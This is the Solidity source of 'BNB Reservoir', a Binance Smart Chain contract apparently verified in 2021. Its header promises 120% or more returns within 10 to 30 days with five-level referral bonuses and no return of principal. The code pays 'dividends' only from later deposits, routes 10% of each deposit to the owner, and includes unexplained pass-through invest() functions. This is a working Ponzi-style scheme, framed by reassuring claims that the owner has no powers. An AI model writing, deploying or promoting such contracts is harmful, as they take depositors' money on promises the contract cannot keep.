/**
 *Submitted for verification at BscScan.com on 2021-11-16
*/

// SPDX-License-Identifier: MIT License


/*********** Description of the BNB BNB Reservoir Smart Contract **************************

 *Profits :  120% after  10  day (10% daily ) more of 10 day 120% +3% per day  maximum 30 day.
 *Referral  5% in Level 1, 3% in Level 2, 2% inlevel 3, 1% in level 4 and  0.5% in level 5 .
 *System Fee 10% of deposit.
 *90% Platform main balance, using for participants payouts, affiliate program bonuses
 *10% Advertising and promotion expenses, Support work, technical functioning, administration fee


 **********************************owner***************************************************

 * Contract owner access to the repository : impossible
 * Closing the contract by the contract owner : impossible
 * Termination the smart contract by the owner of the contract : impossible
 * Cancellation of the contract by the owner : impossible
 * Change the investment plan profit by the owner : impossible
 * Change the investment plan duration by the owner : impossible

 ***********************************User***************************************************

 * Cancel the contract by the user : impossible
 * Termination of the smart contract by the user : impossible
 * Return Capital to user  : impossible
 * Withdraw only rewards and profits : True
 * Change the investment plan profit by the user : impossible
 * Change the investment plan duration by the user : impossible

*******************************************************************************************

 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnbreservoir.com                                   │
 *   │                                                                       │
 *   │   Telegram Public Chat: @ZIFFERHYIP                                   │
 *   │                                                                       │
 *   │   E-mail: [email protected]                                      │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 * Note: The principal deposit cannot be withdrawn, the only return users can get are daily dividends and
 * referral rewards. Payments is possible only if contract balance have enough BNB. Please analyze the transaction
 * history and balance of the smart contract before investing.
 */





pragma solidity >=0.8.0;

struct Plan {
  uint8 plan_duration;
  uint8 percent;
}

struct Deposit {
  uint8 plan;
  uint256 amount;
  uint40 time;
}

struct User {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
}

contract BNBReservoir {

 


    address public owner;
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20, 10, 5]; 

    mapping(uint8 => Plan) public plans;
    mapping(address => User) public users;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 plan);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

 
    constructor() {
        owner = msg.sender;

        uint8 planPercent = 120;
        for (uint8 planDuration = 10; planDuration <= 30; planDuration++) {
            plans[planDuration] = Plan(planDuration, planPercent);
            planPercent+= 3;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            users[_addr].last_payout = uint40(block.timestamp);
            users[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            users[up].match_bonus += bonus;
            users[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = users[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _addr != owner) {
            if(users[_upline].deposits.length == 0) {
                _upline = owner;
            }

            users[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                users[_upline].structure[i]++;

                _upline = users[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _plan, address _upline) external payable {
        require(plans[_plan].plan_duration > 0, "Plan not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        User storage user = users[msg.sender];

        require(user.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        user.deposits.push(Deposit({
            plan: _plan,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        user.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(owner).transfer(msg.value / 10);
        
        emit NewDeposit(msg.sender, msg.value, _plan);
    }
    
    function withdraw() external {
        User storage user = users[msg.sender];

        _payout(msg.sender);

        require(user.dividends > 0 || user.match_bonus > 0, "0 BNB amount");

        uint256 amount = user.dividends + user.match_bonus;

        user.dividends = 0;
        user.match_bonus = 0;
        user.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        User storage user = users[_addr];

        for(uint256 i = 0; i < user.deposits.length; i++) {
            Deposit storage dep = user.deposits[i];
            Plan storage plan = plans[dep.plan];

            uint40 time_end = dep.time + plan.plan_duration * 86400;
            uint40 from = user.last_payout > dep.time ? user.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * plan.percent / plan.plan_duration / 8640000;
            }
        }

        return value;
    }


    
    function investorInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        User storage user = users[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = user.structure[i];
        }

        return (
            payout + user.dividends + user.match_bonus,
            user.total_invested,
            user.total_withdrawn,
            user.total_match_bonus,
            structure
        );
    }

    function contractGolobal() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }

}